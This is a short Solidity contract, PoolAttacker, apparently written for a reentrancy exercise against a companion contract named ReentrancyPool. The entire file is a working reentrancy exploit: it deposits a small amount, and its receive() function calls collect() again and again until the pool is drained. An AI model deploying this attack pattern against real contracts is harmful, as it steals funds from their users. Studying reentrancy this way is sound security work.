pragma solidity ^0.8.20;

import {ReentrancyPool} from "./ReentrancyPool.sol";

contract PoolAttacker {
    ReentrancyPool public pool;
    uint256 public constant ATTACK_AMOUNT = 0.05 ether;

    constructor(address _pool) {
        pool = ReentrancyPool(_pool);
    }

    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT, "Need at least 0.05 ether");
        pool.contribute{value: ATTACK_AMOUNT}();
        pool.collect();
    }

    receive() external payable {
        if (address(pool).balance >= ATTACK_AMOUNT) {
            pool.collect();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
